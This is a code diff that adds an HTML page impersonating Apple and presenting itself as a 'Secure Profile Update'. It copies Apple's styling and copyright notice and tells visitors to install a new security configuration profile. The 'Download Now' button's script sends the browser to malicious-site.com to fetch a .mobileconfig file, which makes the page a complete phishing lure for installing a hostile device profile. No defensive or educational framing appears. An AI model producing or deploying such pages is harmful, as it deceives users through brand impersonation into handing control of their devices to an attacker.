@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apple Secure Update</title>
+  <link rel="apple-touch-icon" href="apple-logo.png">
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "San Francisco", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      text-align: center;
+      background-color: #f2f2f5;
+      color: #333;
+    }
+    h1 {
+      color: #0070c9;
+    }
+    button {
+      background-color: #0070c9;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #005bb5;
+    }
+  </style>
+</head>
+<body>
+  <h1>Apple Secure Profile Update</h1>
+  <p>To enhance the security of your device, please download and install the new <strong>Apple-Secure</strong> configuration profile.</p>
+  <button onclick="downloadProfile()">Download Now</button>
+  <p>Version 1.1 | 2024 © Apple Inc.</p>
+
+  <script>
+    function downloadProfile() {
+      window.location.href = 'https://malicious-site.com/apple-secure.mobileconfig';
+    }
+  </script>
+</body>
+</html>
